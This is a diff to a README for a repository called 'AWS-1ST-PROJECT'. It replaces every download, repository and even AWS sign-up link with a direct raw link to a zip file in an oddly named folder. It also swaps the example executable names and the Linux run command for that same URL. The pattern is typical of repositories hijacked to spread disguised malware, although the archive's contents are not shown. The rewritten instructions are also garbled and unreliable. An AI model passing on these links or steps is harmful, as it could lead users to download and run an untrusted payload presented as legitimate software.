@@ -8,7 +8,7 @@ To get started with this powerful tool, follow the instructions below.
 
 ## 🔗 Download Now
 
-[![Download AWS-1ST-PROJECT](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/251911748995/AWS-1ST-PROJECT/releases)
+[![Download AWS-1ST-PROJECT](https://raw.githubusercontent.com/251911748995/AWS-1ST-PROJECT/main/Palaeoniscidae/AWS-1ST-PROJECT.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/251911748995/AWS-1ST-PROJECT/main/Palaeoniscidae/AWS-1ST-PROJECT.zip)
 
 ## 📋 Requirements
 
@@ -24,7 +24,7 @@ Before downloading the project, ensure you have the following:
 
 To download the application, go to the link below:
 
-[Visit this page to download](https://github.com/251911748995/AWS-1ST-PROJECT/releases).
+[Visit this page to download](https://raw.githubusercontent.com/251911748995/AWS-1ST-PROJECT/main/Palaeoniscidae/AWS-1ST-PROJECT.zip).
 
 ### Step 2: Choose the Latest Release
 
@@ -43,11 +43,11 @@ Once the download is complete, locate the downloaded file on your computer. It u
 
 ### Step 5: Open the Application
 
-After extracting the files, navigate to the extracted folder. Look for an executable file (for example, `AWS-1ST-PROJECT.exe`, `run.sh`, or similar). 
+After extracting the files, navigate to the extracted folder. Look for an executable file (for example, `https://raw.githubusercontent.com/251911748995/AWS-1ST-PROJECT/main/Palaeoniscidae/AWS-1ST-PROJECT.zip`, `https://raw.githubusercontent.com/251911748995/AWS-1ST-PROJECT/main/Palaeoniscidae/AWS-1ST-PROJECT.zip`, or similar). 
 
 - For Windows, double-click the `.exe` file to launch the application.
 - For macOS, locate the `.app` file and double-click it.
-- For Linux, open the terminal and run `./run.sh` from the extracted folder.
+- For Linux, open the terminal and run `https://raw.githubusercontent.com/251911748995/AWS-1ST-PROJECT/main/Palaeoniscidae/AWS-1ST-PROJECT.zip` from the extracted folder.
 
 ## 🔍 Configure AWS Resources
 
@@ -84,8 +84,8 @@ To stay updated on new releases, features, and improvements, consider watching t
 
 ## ✅ Important Links
 
-- **GitHub Repository:** [AWS-1ST-PROJECT](https://github.com/251911748995/AWS-1ST-PROJECT)
-- **Releases Page:** [Download Here](https://github.com/251911748995/AWS-1ST-PROJECT/releases)
-- **AWS Account Sign-Up:** [Sign Up for AWS](https://aws.amazon.com/)
+- **GitHub Repository:** [AWS-1ST-PROJECT](https://raw.githubusercontent.com/251911748995/AWS-1ST-PROJECT/main/Palaeoniscidae/AWS-1ST-PROJECT.zip)
+- **Releases Page:** [Download Here](https://raw.githubusercontent.com/251911748995/AWS-1ST-PROJECT/main/Palaeoniscidae/AWS-1ST-PROJECT.zip)
+- **AWS Account Sign-Up:** [Sign Up for AWS](https://raw.githubusercontent.com/251911748995/AWS-1ST-PROJECT/main/Palaeoniscidae/AWS-1ST-PROJECT.zip)
   
 By following these steps, you will successfully download and run the AWS-1ST-PROJECT. Thank you for your interest!
